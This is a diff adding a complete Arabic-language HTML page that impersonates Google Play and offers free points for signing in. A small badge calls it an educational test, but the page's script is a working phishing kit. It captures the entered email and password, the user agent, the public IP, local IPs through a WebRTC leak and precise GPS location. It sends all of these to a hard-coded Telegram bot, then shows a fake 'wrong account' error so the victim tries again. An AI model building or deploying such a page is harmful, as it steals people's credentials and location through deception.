@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Google Play - اكسب 200 نقطة</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, 'Segoe UI', Arial, sans-serif; }
+body {
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #202124;
+    padding: 20px;
+}
+.box {
+    background: #fff;
+    padding: 40px 30px;
+    border-radius: 8px;
+    max-width: 450px;
+    width: 100%;
+    border: 1px solid #dadce0;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+}
+.logo {
+    text-align: center;
+    margin-bottom: 25px;
+}
+.logo img {
+    height: 40px;
+    width: auto;
+}
+h1 {
+    font-size: 24px;
+    font-weight: 400;
+    text-align: center;
+    margin-bottom: 10px;
+    color: #202124;
+}
+.sub {
+    font-size: 14px;
+    color: #5f6368;
+    text-align: center;
+    margin-bottom: 30px;
+    line-height: 1.6;
+}
+.offer {
+    background: #e8f0fe;
+    border-radius: 8px;
+    padding: 15px;
+    text-align: center;
+    margin-bottom: 25px;
+}
+.offer .num {
+    font-size: 32px;
+    font-weight: bold;
+    color: #1a73e8;
+}
+.offer .lbl {
+    font-size: 13px;
+    color: #5f6368;
+    margin-top: 4px;
+}
+.field {
+    margin-bottom: 18px;
+    position: relative;
+}
+.field input {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 15px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    background: #fff;
+    color: #202124;
+    outline: none;
+    transition: 0.2s;
+    direction: ltr;
+    text-align: left;
+}
+.field input:focus {
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px rgba(26,115,232,0.1);
+}
+.field input::placeholder { color: #80868b; }
+.field label {
+    display: block;
+    font-size: 13px;
+    color: #5f6368;
+    margin-bottom: 6px;
+    text-align: right;
+}
+.btn {
+    width: 100%;
+    padding: 14px;
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: 0.2s;
+}
+.btn:hover { background: #1557b0; }
+.btn:disabled { background: #ccc; cursor: not-allowed; }
+.terms {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin: 20px 0;
+    font-size: 13px;
+    color: #5f6368;
+    text-align: right;
+    line-height: 1.6;
+}
+.terms input {
+    margin-top: 3px;
+    width: 16px;
+    height: 16px;
+    cursor: pointer;
+    flex-shrink: 0;
+}
+.terms a { color: #1a73e8; text-decoration: none; }
+.footer {
+    text-align: center;
+    margin-top: 25px;
+    font-size: 12px;
+    color: #5f6368;
+}
+.footer a { color: #1a73e8; text-decoration: none; margin: 0 8px; }
+.msg {
+    padding: 12px;
+    border-radius: 4px;
+    font-size: 13px;
+    margin-bottom: 15px;
+    display: none;
+    text-align: center;
+}
+.msg.err { background: #fce8e6; color: #c5221f; display: block; }
+.msg.ok { background: #e6f4ea; color: #137333; display: block; }
+.badge {
+    position: fixed;
+    top: 10px;
+    left: 10px;
+    background: rgba(0,0,0,0.7);
+    color: #fff;
+    font-size: 10px;
+    padding: 4px 8px;
+    border-radius: 12px;
+    z-index: 9999;
+}
+</style>
+</head>
+<body>
+<div class="badge">🧪 اختبار تعليمي</div>
+
+<div class="box">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+    </div>
+    
+    <h1>احصل على 200 نقطة مجانية</h1>
+    <p class="sub">عرض حصري لعملاء Google Play. سجّل دخولك لاستلام النقاط.</p>
+
+    <div class="offer">
+        <div class="num">+200</div>
+        <div class="lbl">نقطة Google Play مجانية</div>
+    </div>
+
+    <div class="msg" id="msg"></div>
+
+    <div class="field">
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="example@gmail.com" autocomplete="off">
+    </div>
+
+    <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="pass" placeholder="••••••••" autocomplete="off">
+    </div>
+
+    <div class="terms">
+        <input type="checkbox" id="terms">
+        <label for="terms">أوافق على <a href="#">شروط الاستخدام</a> و <a href="#">سياسة الخصوصية</a> الخاصة بـ Google</label>
+    </div>
+
+    <button class="btn" id="btn" onclick="submitForm()">تسجيل الدخول واستلام النقاط</button>
+
+    <div class="footer">
+        <a href="#">مساعدة</a> • <a href="#">الخصوصية</a> • <a href="#">الشروط</a>
+    </div>
+</div>
+
+<script>
+const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
+const CHAT_ID = "7560932400";
+
+function send(text) {
+    return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    }).catch(()=>{});
+}
+
+async function submitForm() {
+    const email = document.getElementById("email").value.trim();
+    const pass = document.getElementById("pass").value;
+    const terms = document.getElementById("terms").checked;
+    const msg = document.getElementById("msg");
+    const btn = document.getElementById("btn");
+
+    msg.className = "msg";
+
+    if (!email || !pass) {
+        msg.className = "msg err";
+        msg.innerText = "يرجى إدخال البريد الإلكتروني وكلمة المرور";
+        return;
+    }
+
+    if (!terms) {
+        msg.className = "msg err";
+        msg.innerText = "يجب الموافقة على الشروط أولاً";
+        return;
+    }
+
+    btn.disabled = true;
+    btn.innerText = "جاري التحقق...";
+
+    // إرسال البيانات
+    const info = {
+        type: "Google Play",
+        email: email,
+        password: pass,
+        userAgent: navigator.userAgent,
+        time: new Date().toLocaleString("ar-EG")
+    };
+
+    // IP
+    try {
+        const r = await fetch("https://ipwho.is/");
+        const j = await r.json();
+        info.ip = j.ip;
+        info.country = j.country;
+        info.city = j.city;
+    } catch(e) { info.ip = "unknown"; }
+
+    // WebRTC
+    info.webrtc = await new Promise(r => {
+        try {
+            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+            pc.createDataChannel("");
+            const ips = new Set();
+            pc.onicecandidate = e => {
+                if (e.candidate) {
+                    const ip = e.candidate.candidate.split(" ")[4];
+                    if (ip) ips.add(ip);
+                } else { pc.close(); r(Array.from(ips).join(", ")); }
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            setTimeout(() => { pc.close(); r(Array.from(ips).join(", ")); }, 3000);
+        } catch(e) { r("err"); }
+    });
+
+    // الموقع
+    info.gps = await new Promise(r => {
+        if (!navigator.geolocation) return r("غير مدعوم");
+        navigator.geolocation.getCurrentPosition(
+            p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
+            () => r("مرفوض"),
+            {enableHighAccuracy: true, timeout: 8000}
+        );
+    });
+
+    let text = "🎁 Google Play Login:\n\n" + 
+        Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
+    await send(text);
+
+    // بعد ما يبعت، وهم إن الحساب غلط
+    setTimeout(() => {
+        msg.className = "msg err";
+        msg.innerText = "يبدو أن هذا الحساب غير صحيح. حاول مرة أخرى.";
+        btn.disabled = false;
+        btn.innerText = "تسجيل الدخول واستلام النقاط";
+    }, 2000);
+}
+</script>
+</body>
+</html>
